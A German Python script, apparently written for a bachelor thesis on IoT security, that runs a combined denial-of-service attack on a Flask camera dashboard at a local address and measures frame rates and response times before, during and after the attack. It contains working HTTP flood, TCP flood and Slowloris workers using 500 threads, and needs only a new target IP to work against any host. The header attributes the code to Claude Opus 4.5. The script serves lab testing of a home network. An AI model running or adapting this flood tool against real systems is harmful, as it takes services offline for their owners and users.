"""
DoS-Angriff gegen Flask-Dashboard (Port 5000)
Erstellet von Claude Opus 4.5 am 01.02.2026
"""

import threading
import socket
import requests
import time
import csv
import os
import json
import random
from datetime import datetime
from dataclasses import dataclass, field, asdict
from typing import List, Dict
import statistics


CONFIG = {
    "target_ip": "192.168.0.100",
    "target_port_http": 5000,
    "target_port_tcp": 9000,

    "http_flood_threads": 200,
    "tcp_flood_threads": 150,
    "slowloris_threads": 150,
    
    "attack_duration_sec": 60,
    "baseline_duration_sec": 30,
    "recovery_duration_sec": 30,
    "measurement_interval_sec": 1,
    "output_dir": "dos_attack_results"
}

@dataclass
class CameraMeasurement:
    name: str
    fps: float
    fps_min: float
    fps_max: float
    fps_std: float
    latency: float

@dataclass
class Measurement:
    timestamp: str
    phase: str
    response_time_ms: float
    http_status: int
    cameras_online: int
    
    cam_01_fps: float
    cam_01_latency: float
    cam_02_fps: float
    cam_02_latency: float
    cam_03_fps: float
    cam_03_latency: float
    
    avg_fps: float
    avg_latency: float
    success: bool

@dataclass
class AttackReport:
    experiment_name: str = "DoS gegen Dashboard (Aggressive)"
    experiment_date: str = ""
    experiment_time: str = ""
    target: str = ""
    attack_type: str = "HTTP Flood + TCP Flood + Slowloris"
    
    http_threads: int = 0
    tcp_threads: int = 0
    slowloris_threads: int = 0
    total_threads: int = 0
    duration_sec: int = 0
    
    baseline_avg_response_ms: float = 0
    baseline_success_rate: float = 0
    baseline_cam_01_fps: float = 0
    baseline_cam_02_fps: float = 0
    baseline_cam_03_fps: float = 0
    baseline_avg_fps: float = 0
    baseline_avg_latency: float = 0
    
    attack_avg_response_ms: float = 0
    attack_success_rate: float = 0
    attack_cam_01_fps: float = 0
    attack_cam_02_fps: float = 0
    attack_cam_03_fps: float = 0
    attack_avg_fps: float = 0
    attack_avg_latency: float = 0
    attack_http_requests: int = 0
    attack_tcp_connections: int = 0
    attack_slowloris_connections: int = 0
    
    recovery_avg_response_ms: float = 0
    recovery_success_rate: float = 0
    recovery_time_sec: float = 0
    
    availability_impact: str = ""
    fps_reduction_percent: float = 0
    latency_increase_percent: float = 0
    vulnerability_confirmed: bool = False
    
    measurements: List[dict] = field(default_factory=list)

class AggressiveDoSAttacker:
    def __init__(self, config: dict):
        self.config = config
        self.target_ip = config['target_ip']
        self.target_url = f"http://{config['target_ip']}:{config['target_port_http']}"
        self.status_url = f"{self.target_url}/status"
        
        self.stop_attack = False
        self.http_count = 0
        self.tcp_count = 0
        self.slowloris_count = 0
        self.error_count = 0
        
        self.slowloris_sockets: List[socket.socket] = []
      
        self.measurements: List[Measurement] = []
        self.report = AttackReport()
        
        os.makedirs(config['output_dir'], exist_ok=True)
        self.run_id = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    def log(self, msg: str, level: str = "INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        symbols = {
            "INFO": "ℹ️ ", "ATTACK": "⚔️ ", "MEASURE": "📊",
            "SUCCESS": "✅", "ERROR": "❌", "WARN": "⚠️ ",
            "HTTP": "🌐", "TCP": "🔌", "SLOWLORIS": "🐌"
        }
        print(f"[{timestamp}] {symbols.get(level, '•')} {msg}")

    def measure_once(self, phase: str) -> Measurement:
        timestamp = datetime.now().isoformat()

        cam_data = {
            "Cam_01": {"fps": 0, "latency": 0},
            "Cam_02": {"fps": 0, "latency": 0},
            "Cam_03": {"fps": 0, "latency": 0}
        }
        
        try:
            start = time.time()
            r = requests.get(self.status_url, timeout=5)
            response_time = (time.time() - start) * 1000
            
            if r.status_code == 200:
                data = r.json()
                cameras = data.get('cameras', [])
                
                for cam in cameras:
                    name = cam.get('name', '')
                    if 'Cam_01' in name or 'Garten' in name or name == cameras[0].get('name', '') if cameras else False:
                        key = "Cam_01"
                    elif 'Cam_02' in name or len(cameras) > 1 and name == cameras[1].get('name', ''):
                        key = "Cam_02"
                    elif 'Cam_03' in name or len(cameras) > 2 and name == cameras[2].get('name', ''):
                        key = "Cam_03"
                    else:
                        continue
                    
                    cam_data[key] = {
                        "fps": cam.get('fps', 0),
                        "latency": cam.get('latency', 0)
                    }
                
                for i, cam in enumerate(cameras[:3]):
                    key = f"Cam_0{i+1}"
                    cam_data[key] = {
                        "fps": cam.get('fps', 0),
                        "latency": cam.get('latency', 0)
                    }
                
                avg_fps = statistics.mean([c['fps'] for c in cameras]) if cameras else 0
                avg_latency = statistics.mean([c['latency'] for c in cameras]) if cameras else 0
                
                return Measurement(
                    timestamp=timestamp,
                    phase=phase,
                    response_time_ms=round(response_time, 2),
                    http_status=r.status_code,
                    cameras_online=len(cameras),
                    cam_01_fps=round(cam_data["Cam_01"]["fps"], 2),
                    cam_01_latency=round(cam_data["Cam_01"]["latency"], 2),
                    cam_02_fps=round(cam_data["Cam_02"]["fps"], 2),
                    cam_02_latency=round(cam_data["Cam_02"]["latency"], 2),
                    cam_03_fps=round(cam_data["Cam_03"]["fps"], 2),
                    cam_03_latency=round(cam_data["Cam_03"]["latency"], 2),
                    avg_fps=round(avg_fps, 2),
                    avg_latency=round(avg_latency, 2),
                    success=True
                )
            else:
                return self._failed_measurement(timestamp, phase, response_time, r.status_code)
                
        except requests.exceptions.Timeout:
            return self._failed_measurement(timestamp, phase, 5000, 0)
        except Exception as e:
            self.error_count += 1
            return self._failed_measurement(timestamp, phase, 0, -1)
    
    def _failed_measurement(self, timestamp: str, phase: str, 
                           response_time: float, status: int) -> Measurement:
        return Measurement(
            timestamp=timestamp, phase=phase,
            response_time_ms=round(response_time, 2), http_status=status,
            cameras_online=0,
            cam_01_fps=0, cam_01_latency=0,
            cam_02_fps=0, cam_02_latency=0,
            cam_03_fps=0, cam_03_latency=0,
            avg_fps=0, avg_latency=0, success=False
        )
    
    def measure_phase(self, phase: str, duration_sec: int) -> List[Measurement]:
        self.log(f"Starte Messung: {phase.upper()} ({duration_sec}s)", "MEASURE")
        
        measurements = []
        end_time = time.time() + duration_sec
        
        while time.time() < end_time:
            m = self.measure_once(phase)
            measurements.append(m)
            
            status = "✓" if m.success else "✗"
            self.log(
                f"  {status} Response: {m.response_time_ms:>6.0f}ms | "
                f"Cams: {m.cameras_online} | "
                f"FPS: [{m.cam_01_fps:.1f}, {m.cam_02_fps:.1f}, {m.cam_03_fps:.1f}] "
                f"Avg: {m.avg_fps:.1f}",
                "MEASURE"
            )
            
            time.sleep(self.config['measurement_interval_sec'])
        
        return measurements
    
    def http_flood_worker(self):
        endpoints = ["/status", "/", "/dashboard", 
                    "/frame/Cam_01", "/frame/Cam_02", "/frame/Cam_03"]
        
        while not self.stop_attack:
            try:
                endpoint = random.choice(endpoints)
                requests.get(f"{self.target_url}{endpoint}", timeout=1)
                self.http_count += 1
            except:
                self.error_count += 1
    
    def tcp_flood_worker(self):
        while not self.stop_attack:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target_ip, self.config['target_port_tcp']))
                
                fake_header = f"CAM:FAKE_CAM_{random.randint(1000,9999)}:0:0\n"
                sock.send(fake_header.encode())
                
                self.tcp_count += 1
                sock.close()
            except:
                self.error_count += 1

    def slowloris_worker(self):
        while not self.stop_attack:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target_ip, self.config['target_port_http']))
                
                sock.send(b"GET / HTTP/1.1\r\n")
                sock.send(f"Host: {self.target_ip}\r\n".encode())
                sock.send(b"User-Agent: Mozilla/5.0\r\n")
                
                self.slowloris_sockets.append(sock)
                self.slowloris_count += 1
              
                while not self.stop_attack:
                    try:
                        sock.send(f"X-Alive: {random.randint(1, 10000)}\r\n".encode())
                        time.sleep(5)
                    except:
                        break
                        
            except:
                self.error_count += 1
    
    def run_attack(self) -> List[Measurement]:
        total = (self.config['http_flood_threads'] + 
                self.config['tcp_flood_threads'] + 
                self.config['slowloris_threads'])
        
        self.log(f"Starte KOMBINIERTEN Angriff mit {total} Threads", "ATTACK")
        self.log(f"  HTTP Flood:  {self.config['http_flood_threads']} Threads", "HTTP")
        self.log(f"  TCP Flood:   {self.config['tcp_flood_threads']} Threads", "TCP")
        self.log(f"  Slowloris:   {self.config['slowloris_threads']} Threads", "SLOWLORIS")
        
        self.stop_attack = False
        self.http_count = 0
        self.tcp_count = 0
        self.slowloris_count = 0
        self.error_count = 0
        self.slowloris_sockets = []
        
        threads = []
        
        for _ in range(self.config['http_flood_threads']):
            t = threading.Thread(target=self.http_flood_worker, daemon=True)
            t.start()
            threads.append(t)

        for _ in range(self.config['tcp_flood_threads']):
            t = threading.Thread(target=self.tcp_flood_worker, daemon=True)
            t.start()
            threads.append(t)
        
        for _ in range(self.config['slowloris_threads']):
            t = threading.Thread(target=self.slowloris_worker, daemon=True)
            t.start()
            threads.append(t)
        
        attack_measurements = []
        end_time = time.time() + self.config['attack_duration_sec']
        
        while time.time() < end_time:
            m = self.measure_once("attack")
            attack_measurements.append(m)
            
            status = "✓" if m.success else "✗"
            self.log(
                f"  {status} Resp: {m.response_time_ms:>5.0f}ms | "
                f"HTTP: {self.http_count:>6} | TCP: {self.tcp_count:>5} | "
                f"Slowloris: {self.slowloris_count:>4} | "
                f"FPS: {m.avg_fps:.1f}",
                "ATTACK"
            )
            
            time.sleep(self.config['measurement_interval_sec'])
        
        self.stop_attack = True
        
        for sock in self.slowloris_sockets:
            try:
                sock.close()
            except:
                pass
        
        self.log(f"Angriff beendet.", "ATTACK")
        self.log(f"  HTTP Requests:     {self.http_count}", "HTTP")
        self.log(f"  TCP Connections:   {self.tcp_count}", "TCP")
        self.log(f"  Slowloris Conns:   {self.slowloris_count}", "SLOWLORIS")
        self.log(f"  Fehler:            {self.error_count}", "ERROR")
        
        return attack_measurements
      
    def calculate_stats(self, measurements: List[Measurement]) -> dict:
        if not measurements:
            return {}
        
        successful = [m for m in measurements if m.success]
        
        def safe_mean(values):
            valid = [v for v in values if v > 0]
            return statistics.mean(valid) if valid else 0
        
        return {
            "avg_response_ms": round(safe_mean([m.response_time_ms for m in measurements]), 2),
            "max_response_ms": round(max([m.response_time_ms for m in measurements]), 2),
            "success_rate": round(len(successful) / len(measurements) * 100, 1),
            "cam_01_fps": round(safe_mean([m.cam_01_fps for m in successful]), 2),
            "cam_02_fps": round(safe_mean([m.cam_02_fps for m in successful]), 2),
            "cam_03_fps": round(safe_mean([m.cam_03_fps for m in successful]), 2),
            "avg_fps": round(safe_mean([m.avg_fps for m in successful]), 2),
            "avg_latency": round(safe_mean([m.avg_latency for m in successful]), 2),
        }

    def save_results(self):
        base_path = os.path.join(self.config['output_dir'], f"dos_aggressive_{self.run_id}")
        
        csv_path = f"{base_path}_measurements.csv"
        with open(csv_path, 'w', newline='') as f:
            fieldnames = [
                'timestamp', 'phase', 'response_time_ms', 'http_status',
                'cameras_online', 'cam_01_fps', 'cam_01_latency',
                'cam_02_fps', 'cam_02_latency', 'cam_03_fps', 'cam_03_latency',
                'avg_fps', 'avg_latency', 'success'
            ]
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            for m in self.measurements:
                writer.writerow(asdict(m))
        self.log(f"CSV gespeichert: {csv_path}", "SUCCESS")
        
        json_path = f"{base_path}_report.json"
        with open(json_path, 'w') as f:
            json.dump(asdict(self.report), f, indent=2, default=str)
        self.log(f"JSON gespeichert: {json_path}", "SUCCESS")
        
        md_path = f"{base_path}_summary.md"
        with open(md_path, 'w') as f:
            f.write(self.generate_markdown_report())
        self.log(f"Markdown gespeichert: {md_path}", "SUCCESS")
    
    def generate_markdown_report(self) -> str:
        r = self.report

        if r.baseline_avg_fps > 0:
            fps_reduction = ((r.baseline_avg_fps - r.attack_avg_fps) / r.baseline_avg_fps) * 100
        else:
            fps_reduction = 0
        
        if r.baseline_avg_latency > 0:
            latency_increase = ((r.attack_avg_latency - r.baseline_avg_latency) / r.baseline_avg_latency) * 100
        else:
            latency_increase = 0
        
        return f"""# DoS-Angriff Experiment Report (Aggressive Version)

## Experiment-Details

| Parameter | Wert |
|-----------|------|
| Datum | {r.experiment_date} |
| Uhrzeit | {r.experiment_time} |
| Ziel | {r.target} |
| Angriffstyp | {r.attack_type} |
| HTTP-Flood Threads | {r.http_threads} |
| TCP-Flood Threads | {r.tcp_threads} |
| Slowloris Threads | {r.slowloris_threads} |
| **Gesamt Threads** | **{r.total_threads}** |
| Dauer | {r.duration_sec} Sekunden |

## Ergebnisse nach Kamera

### Baseline (vor Angriff)

| Kamera | FPS | Latenz (ms) |
|--------|-----|-------------|
| Cam_01 | {r.baseline_cam_01_fps:.1f} | - |
| Cam_02 | {r.baseline_cam_02_fps:.1f} | - |
| Cam_03 | {r.baseline_cam_03_fps:.1f} | - |
| **Durchschnitt** | **{r.baseline_avg_fps:.1f}** | **{r.baseline_avg_latency:.0f}** |

### Während Angriff

| Kamera | FPS | Veränderung |
|--------|-----|-------------|
| Cam_01 | {r.attack_cam_01_fps:.1f} | {((r.attack_cam_01_fps - r.baseline_cam_01_fps) / r.baseline_cam_01_fps * 100) if r.baseline_cam_01_fps > 0 else 0:+.1f}% |
| Cam_02 | {r.attack_cam_02_fps:.1f} | {((r.attack_cam_02_fps - r.baseline_cam_02_fps) / r.baseline_cam_02_fps * 100) if r.baseline_cam_02_fps > 0 else 0:+.1f}% |
| Cam_03 | {r.attack_cam_03_fps:.1f} | {((r.attack_cam_03_fps - r.baseline_cam_03_fps) / r.baseline_cam_03_fps * 100) if r.baseline_cam_03_fps > 0 else 0:+.1f}% |
| **Durchschnitt** | **{r.attack_avg_fps:.1f}** | **{-fps_reduction:.1f}%** |

### Angriffs-Statistik

| Metrik | Wert |
|--------|------|
| HTTP Requests gesendet | {r.attack_http_requests:,} |
| TCP Connections | {r.attack_tcp_connections:,} |
| Slowloris Connections | {r.attack_slowloris_connections:,} |
| Server-Erfolgsrate | {r.attack_success_rate:.1f}% |
| Ø Response-Zeit | {r.attack_avg_response_ms:.0f} ms |

### Recovery (nach Angriff)

| Metrik | Wert |
|--------|------|
| Ø Response-Zeit | {r.recovery_avg_response_ms:.2f} ms |
| Erfolgsrate | {r.recovery_success_rate:.1f}% |
| Zeit bis Recovery | {r.recovery_time_sec:.1f} Sekunden |

## Bewertung

### Quantitative Auswirkungen

| Metrik | Baseline | Angriff | Veränderung |
|--------|----------|---------|-------------|
| Response-Zeit | {r.baseline_avg_response_ms:.0f} ms | {r.attack_avg_response_ms:.0f} ms | +{r.attack_avg_response_ms - r.baseline_avg_response_ms:.0f} ms |
| Erfolgsrate | {r.baseline_success_rate:.0f}% | {r.attack_success_rate:.0f}% | {r.attack_success_rate - r.baseline_success_rate:.0f}% |
| FPS (Durchschnitt) | {r.baseline_avg_fps:.1f} | {r.attack_avg_fps:.1f} | {-fps_reduction:.1f}% |
| Latenz | {r.baseline_avg_latency:.0f} ms | {r.attack_avg_latency:.0f} ms | {latency_increase:+.1f}% |

### Gesamtbewertung

**Auswirkung auf Verfügbarkeit:** {r.availability_impact}

**Schwachstelle bestätigt:** {"✅ Ja" if r.vulnerability_confirmed else "❌ Nein"}

### CIA-Triade Bewertung

| Schutzziel | Status | Begründung |
|------------|--------|------------|
| **Confidentiality** | ⚪ Nicht betroffen | Kein Datenleck durch diesen Angriff |
| **Integrity** | ⚪ Nicht betroffen | Keine Datenmanipulation |
| **Availability** | {"🔴 KRITISCH" if r.attack_success_rate < 50 else "🟠 BEEINTRÄCHTIGT" if r.attack_success_rate < 90 else "🟢 OK"} | {r.availability_impact} |

## Fazit

{self._generate_conclusion()}

---
*Automatisch generiert am {r.experiment_date} um {r.experiment_time}*
*Tool: DoS-Attack-Script für Bachelorarbeit IoT-Sicherheitsanalyse*
"""
    
    def _generate_conclusion(self) -> str:
        r = self.report
        
        if r.attack_success_rate < 50:
            return f"""Der kombinierte DoS-Angriff war **erfolgreich**. Das Dashboard war während des Angriffs 
weitgehend nicht erreichbar (Erfolgsrate: {r.attack_success_rate:.1f}%). 

Dies bestätigt die Hypothese, dass der Flask-Server auf dem Raspberry Pi anfällig für 
Denial-of-Service-Angriffe ist, wenn mehrere Angriffsvektoren (HTTP Flood, TCP Flood, 
Slowloris) kombiniert werden.

**Empfehlung:** Implementierung von Rate-Limiting, Connection-Pooling und 
eventuell einen Reverse-Proxy (nginx) vor dem Flask-Server."""
        
        elif r.attack_success_rate < 80:
            return f"""Der DoS-Angriff zeigte **teilweise Wirkung**. Die Erfolgsrate sank auf {r.attack_success_rate:.1f}%,
und die durchschnittliche FPS fiel von {r.baseline_avg_fps:.1f} auf {r.attack_avg_fps:.1f}.

Das System zeigt eine gewisse Resilienz, ist aber unter Last beeinträchtigt.

**Empfehlung:** Erhöhung der Server-Ressourcen oder Implementierung von 
Schutzmaßnahmen wie Rate-Limiting."""
        
        else:
            return f"""Der DoS-Angriff hatte **geringe Auswirkungen**. Das System blieb mit einer 
Erfolgsrate von {r.attack_success_rate:.1f}% weitgehend funktionsfähig.

Der Raspberry Pi 5 mit seinen 8GB RAM und Quad-Core CPU zeigt gute Resilienz 
gegen diesen Angriffstyp.

**Hinweis:** Ein Angriff direkt gegen die ressourcenschwachen ESP32-CAMs 
könnte effektiver sein."""
    
    def print_summary(self):
        r = self.report
        
        print("\n" + "=" * 70)
        print("                        ZUSAMMENFASSUNG")
        print("=" * 70)
        
        print(f"""
┌────────────────────────────────────────────────────────────────────┐
│                     BASELINE vs ANGRIFF                            │
├────────────────────────────────────────────────────────────────────┤
│  Kamera    │  Baseline FPS  │  Angriff FPS  │  Veränderung         │
├────────────┼────────────────┼───────────────┼──────────────────────┤
│  Cam_01    │  {r.baseline_cam_01_fps:>10.1f}    │  {r.attack_cam_01_fps:>10.1f}   │  {((r.attack_cam_01_fps - r.baseline_cam_01_fps) / r.baseline_cam_01_fps * 100) if r.baseline_cam_01_fps > 0 else 0:>+10.1f}%        │
│  Cam_02    │  {r.baseline_cam_02_fps:>10.1f}    │  {r.attack_cam_02_fps:>10.1f}   │  {((r.attack_cam_02_fps - r.baseline_cam_02_fps) / r.baseline_cam_02_fps * 100) if r.baseline_cam_02_fps > 0 else 0:>+10.1f}%        │
│  Cam_03    │  {r.baseline_cam_03_fps:>10.1f}    │  {r.attack_cam_03_fps:>10.1f}   │  {((r.attack_cam_03_fps - r.baseline_cam_03_fps) / r.baseline_cam_03_fps * 100) if r.baseline_cam_03_fps > 0 else 0:>+10.1f}%        │
├────────────────────────────────────────────────────────────────────┤
│  GESAMT                                                            │
├────────────────────────────────────────────────────────────────────┤
│  Response-Zeit:     {r.baseline_avg_response_ms:>6.0f} ms  →  {r.attack_avg_response_ms:>6.0f} ms                      │
│  Erfolgsrate:       {r.baseline_success_rate:>6.1f}%   →  {r.attack_success_rate:>6.1f}%                        │
│  Durchschnitt FPS:  {r.baseline_avg_fps:>6.1f}     →  {r.attack_avg_fps:>6.1f}                          │
├────────────────────────────────────────────────────────────────────┤
│  ANGRIFFS-STATISTIK                                                │
│  HTTP Requests:     {r.attack_http_requests:>10,}                                     │
│  TCP Connections:   {r.attack_tcp_connections:>10,}                                     │
│  Slowloris:         {r.attack_slowloris_connections:>10,}                                     │
├────────────────────────────────────────────────────────────────────┤
│  BEWERTUNG: {r.availability_impact:<54} │
│  SCHWACHSTELLE BESTÄTIGT: {"JA ✅" if r.vulnerability_confirmed else "NEIN ❌":<42} │
└────────────────────────────────────────────────────────────────────┘
        """)
    
    def run_full_experiment(self):
        self.log("=" * 70)
        self.log("DoS-ANGRIFF EXPERIMENT (AGGRESSIVE VERSION)")
        self.log(f"Ziel: {self.target_url}")
        self.log("=" * 70)
        
        self.report.experiment_date = datetime.now().strftime("%Y-%m-%d")
        self.report.experiment_time = datetime.now().strftime("%H:%M:%S")
        self.report.target = self.target_url
        self.report.http_threads = self.config['http_flood_threads']
        self.report.tcp_threads = self.config['tcp_flood_threads']
        self.report.slowloris_threads = self.config['slowloris_threads']
        self.report.total_threads = (self.config['http_flood_threads'] + 
                                     self.config['tcp_flood_threads'] + 
                                     self.config['slowloris_threads'])
        self.report.duration_sec = self.config['attack_duration_sec']
        
        self.log("\n" + "=" * 50)
        self.log("PHASE 1: BASELINE-MESSUNG")
        self.log("=" * 50)
        baseline = self.measure_phase("baseline", self.config['baseline_duration_sec'])
        self.measurements.extend(baseline)
        baseline_stats = self.calculate_stats(baseline)
        
        self.report.baseline_avg_response_ms = baseline_stats.get('avg_response_ms', 0)
        self.report.baseline_success_rate = baseline_stats.get('success_rate', 0)
        self.report.baseline_cam_01_fps = baseline_stats.get('cam_01_fps', 0)
        self.report.baseline_cam_02_fps = baseline_stats.get('cam_02_fps', 0)
        self.report.baseline_cam_03_fps = baseline_stats.get('cam_03_fps', 0)
        self.report.baseline_avg_fps = baseline_stats.get('avg_fps', 0)
        self.report.baseline_avg_latency = baseline_stats.get('avg_latency', 0)
        
        self.log("\n" + "=" * 50)
        self.log("PHASE 2: KOMBINIERTER DOS-ANGRIFF")
        self.log("=" * 50)
        attack = self.run_attack()
        self.measurements.extend(attack)
        attack_stats = self.calculate_stats(attack)
        
        self.report.attack_avg_response_ms = attack_stats.get('avg_response_ms', 0)
        self.report.attack_success_rate = attack_stats.get('success_rate', 0)
        self.report.attack_cam_01_fps = attack_stats.get('cam_01_fps', 0)
        self.report.attack_cam_02_fps = attack_stats.get('cam_02_fps', 0)
        self.report.attack_cam_03_fps = attack_stats.get('cam_03_fps', 0)
        self.report.attack_avg_fps = attack_stats.get('avg_fps', 0)
        self.report.attack_avg_latency = attack_stats.get('avg_latency', 0)
        self.report.attack_http_requests = self.http_count
        self.report.attack_tcp_connections = self.tcp_count
        self.report.attack_slowloris_connections = self.slowloris_count
        
        self.log("\n" + "=" * 50)
        self.log("PHASE 3: RECOVERY-MESSUNG")
        self.log("=" * 50)
        recovery = self.measure_phase("recovery", self.config['recovery_duration_sec'])
        self.measurements.extend(recovery)
        recovery_stats = self.calculate_stats(recovery)
        
        self.report.recovery_avg_response_ms = recovery_stats.get('avg_response_ms', 0)
        self.report.recovery_success_rate = recovery_stats.get('success_rate', 0)
        
        recovery_time = 0
        for i, m in enumerate(recovery):
            if m.success:
                recovery_time = i * self.config['measurement_interval_sec']
                break
        self.report.recovery_time_sec = recovery_time
        
        fps_drop = self.report.baseline_avg_fps - self.report.attack_avg_fps
        fps_drop_percent = (fps_drop / self.report.baseline_avg_fps * 100) if self.report.baseline_avg_fps > 0 else 0
        
        if self.report.attack_success_rate < 50:
            self.report.availability_impact = "KRITISCH - Dashboard nicht erreichbar"
            self.report.vulnerability_confirmed = True
        elif self.report.attack_success_rate < 80 or fps_drop_percent > 30:
            self.report.availability_impact = "HOCH - Starke Beeinträchtigung"
            self.report.vulnerability_confirmed = True
        elif fps_drop_percent > 15:
            self.report.availability_impact = "MITTEL - Spürbare Beeinträchtigung"
            self.report.vulnerability_confirmed = True
        else:
            self.report.availability_impact = "GERING - System resilient"
            self.report.vulnerability_confirmed = False
        
        self.report.fps_reduction_percent = fps_drop_percent
        
        self.report.measurements = [asdict(m) for m in self.measurements]
        
        self.save_results()
        
        self.print_summary()
      
if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════════════════════════════╗
    ║   DoS-ANGRIFF TOOL (AGGRESSIVE VERSION)                          ║
    ║   Bachelorarbeit: IoT-Sicherheitsanalyse ESP32-CAM               ║
    ║                                                                   ║
    ║   Angriffsmethoden:                                              ║
    ║   • HTTP Flood (200 Threads)                                     ║
    ║   • TCP Flood gegen Port 9000 (150 Threads)                      ║
    ║   • Slowloris - Verbindungen offen halten (150 Threads)          ║
    ║                                                                   ║
    ║   ⚠️  WARNUNG: Nur im eigenen Testnetzwerk verwenden!            ║
    ╚═══════════════════════════════════════════════════════════════════╝
    """)
    
    print("Aktuelle Konfiguration:")
    print(f"  Ziel:              {CONFIG['target_ip']}:{CONFIG['target_port_http']}")
    print(f"  HTTP Threads:      {CONFIG['http_flood_threads']}")
    print(f"  TCP Threads:       {CONFIG['tcp_flood_threads']}")
    print(f"  Slowloris Threads: {CONFIG['slowloris_threads']}")
    print(f"  Gesamt Threads:    {CONFIG['http_flood_threads'] + CONFIG['tcp_flood_threads'] + CONFIG['slowloris_threads']}")
    print(f"  Angriffsdauer:     {CONFIG['attack_duration_sec']}s")
    print(f"  Output:            {CONFIG['output_dir']}/")
    print()
    
    confirm = input("Experiment starten? (j/n): ").strip().lower()
    if confirm != 'j':
        print("Abgebrochen.")
        exit()
    
    attacker = AggressiveDoSAttacker(CONFIG)
    
    try:
        attacker.run_full_experiment()
    except KeyboardInterrupt:
        print("\n[!] Durch Benutzer abgebrochen")
        attacker.stop_attack = True
        time.sleep(1)
        attacker.save_results()
    
    print("\n✅ Experiment abgeschlossen!")
    print(f"📁 Ergebnisse in: {CONFIG['output_dir']}/")
